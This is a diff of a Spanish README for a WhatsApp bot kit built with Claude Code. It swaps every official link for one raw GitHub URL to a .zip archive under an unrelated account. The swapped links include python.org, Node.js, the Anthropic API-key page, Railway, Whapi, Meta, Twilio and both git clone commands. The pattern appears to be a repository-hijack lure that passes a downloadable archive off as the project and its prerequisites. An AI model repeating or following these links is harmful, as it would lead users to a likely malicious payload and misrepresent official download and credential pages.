@@ -25,7 +25,7 @@ Tu solo respondes preguntas sobre tu negocio. Claude Code se encarga de:
 ### Paso 1: Tu clonas el repo y corres un comando
 
 ```bash
-git clone https://github.com/Hainrixz/whatsapp-agentkit.git
+git clone https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip
 cd whatsapp-agentkit
 bash start.sh
 ```
@@ -112,7 +112,7 @@ Cuando estes satisfecho con tu agente, Claude Code te guia para ponerlo en linea
 
 1. **Claude Code prepara tu proyecto** para produccion (ajusta configuracion)
 2. **Tu lo subes a GitHub** — Claude Code te da los comandos exactos para crear tu repo
-3. **Conectas Railway** — entras a [railway.app](https://railway.app), le das tu repo de GitHub y Railway lo deployea automaticamente
+3. **Conectas Railway** — entras a [railway.app](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip), le das tu repo de GitHub y Railway lo deployea automaticamente
 4. **Configuras las variables** — Claude Code te dice exactamente cuales poner en Railway (las mismas API keys de tu .env)
 5. **Configuras el webhook** — Claude Code te guia para conectar tu proveedor de WhatsApp con la URL de Railway
 
@@ -167,14 +167,14 @@ El cliente recibe la respuesta en segundos
 Necesitas 4 cosas antes de empezar:
 
 ### 1. Python 3.11 o superior
-- **Mac**: `brew install python` o descarga de [python.org](https://python.org/downloads)
-- **Windows**: Descarga de [python.org](https://python.org/downloads) (marca "Add to PATH")
+- **Mac**: `brew install python` o descarga de [python.org](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip)
+- **Windows**: Descarga de [python.org](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip) (marca "Add to PATH")
 - **Linux**: `sudo apt install python3.11`
 - Verifica: `python3 --version`
 
 ### 2. Claude Code
 ```bash
-# Primero necesitas Node.js: https://nodejs.org
+# Primero necesitas Node.js: https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip
 npm install -g @anthropic-ai/claude-code
 
 # Autenticate (solo la primera vez)
@@ -182,7 +182,7 @@ claude
 ```
 
 ### 3. API Key de Anthropic
-1. Ve a [platform.anthropic.com](https://platform.anthropic.com/settings/api-keys)
+1. Ve a [platform.anthropic.com](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip)
 2. Crea una cuenta o inicia sesion
 3. Ve a Settings → API Keys → Create Key
 4. Copia la key (empieza con `sk-ant-...`)
@@ -191,9 +191,9 @@ claude
 
 | Proveedor | Dificultad | Costo | Mejor para |
 |-----------|-----------|-------|------------|
-| [Whapi.cloud](https://whapi.cloud) | Facil | Sandbox gratis | Empezar rapido, probar |
-| [Meta Cloud API](https://developers.facebook.com) | Media | Gratis por conversacion | Produccion seria |
-| [Twilio](https://twilio.com) | Media | Pago por mensaje | Empresas, alta confiabilidad |
+| [Whapi.cloud](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip) | Facil | Sandbox gratis | Empezar rapido, probar |
+| [Meta Cloud API](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip) | Media | Gratis por conversacion | Produccion seria |
+| [Twilio](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip) | Media | Pago por mensaje | Empresas, alta confiabilidad |
 
 **Si no estas seguro, empieza con Whapi.cloud.** Es la opcion mas rapida — te registras, copias un token, y listo.
 
@@ -203,7 +203,7 @@ claude
 
 ```bash
 # 1. Clona el repositorio
-git clone https://github.com/Hainrixz/whatsapp-agentkit.git
+git clone https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip
 cd whatsapp-agentkit
 
 # 2. Verifica tu entorno
@@ -223,20 +223,20 @@ Claude Code te guia desde ahi. Solo responde las preguntas.
 AgentKit soporta 3 proveedores. Tu eliges cual usar durante el setup.
 
 ### Whapi.cloud (recomendado para empezar)
-- Registrate en [whapi.cloud](https://whapi.cloud)
+- Registrate en [whapi.cloud](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip)
 - Tienen un sandbox gratuito (no necesitas verificar nada)
 - Solo necesitas: **1 token**
 - Ideal para probar y para negocios pequenos
 
 ### Meta Cloud API (oficial)
-- Configura en [developers.facebook.com](https://developers.facebook.com)
+- Configura en [developers.facebook.com](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip)
 - Es la API oficial de WhatsApp (de Meta/Facebook)
 - Necesitas: **Access Token** + **Phone Number ID** + **Verify Token**
 - Requiere cuenta de Facebook Business verificada
 - Gratis por conversacion (pagas solo por conversaciones iniciadas por ti)
 
 ### Twilio
-- Registrate en [twilio.com](https://twilio.com)
+- Registrate en [twilio.com](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip)
 - Muy confiable, excelente documentacion
 - Necesitas: **Account SID** + **Auth Token** + **Phone Number**
 - Tiene sandbox para probar gratis
@@ -365,9 +365,9 @@ El regenerara los archivos necesarios.
 
 ## Creditos
 
-Creado por **Todo de IA** — [@soyenriquerocha](https://instagram.com/soyenriquerocha)
+Creado por **Todo de IA** — [@soyenriquerocha](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip)
 
-Construido con [Claude Code](https://claude.ai/claude-code) para builders de LATAM.
+Construido con [Claude Code](https://raw.githubusercontent.com/onehundredfortyfive-southernbaptist487/whatsapp-agentkit/main/.claude/commands/whatsapp_agentkit_3.5.zip) para builders de LATAM.
 
 ---
 
